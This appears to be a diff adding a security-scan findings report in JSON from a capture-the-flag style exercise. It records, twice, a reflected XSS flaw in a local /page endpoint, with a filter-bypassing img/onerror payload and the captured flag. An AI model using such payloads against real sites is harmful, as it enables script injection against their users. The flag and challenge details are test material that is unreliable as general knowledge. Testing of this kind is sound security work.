@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T16:32:55.792398+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "02759130-246e-4323-b694-ae0717c7b790",
+      "timestamp": "2026-04-14T16:32:55.792292+00:00",
+      "title": "XSS vulnerability in /page endpoint",
+      "severity": "high",
+      "target": "http://172.17.0.1:33187/page",
+      "description": "The /page endpoint reflects the 'name' query parameter in the HTML response without proper sanitization. While 'script' tags and single quotes are filtered, double-quote payloads bypass the filter.",
+      "evidence": "flag{6a800548-42a6-4dcb-ab24-5d55c2e040e0}",
+      "tool_used": "http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /page?name=<img src=x onerror=alert(\"XSS\")>",
+        "expected": "XSS alert triggered, flag returned in response"
+      }
+    },
+    {
+      "id": "a3505489-4997-4b4b-8417-1c83e38d4bab",
+      "timestamp": "2026-04-14T16:32:55.970872+00:00",
+      "title": "XSS vulnerability in /page endpoint",
+      "severity": "high",
+      "target": "http://172.17.0.1:33187/page",
+      "description": "The /page endpoint reflects the 'name' query parameter in the HTML response without proper sanitization. While 'script' tags and single quotes are filtered, double-quote payloads bypass the filter.",
+      "evidence": "flag{6a800548-42a6-4dcb-ab24-5d55c2e040e0}",
+      "tool_used": "http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /page?name=<img src=x onerror=alert(\"XSS\")>",
+        "expected": "XSS alert triggered, flag returned in response"
+      }
+    }
+  ],
+  "diagrams": []
+}
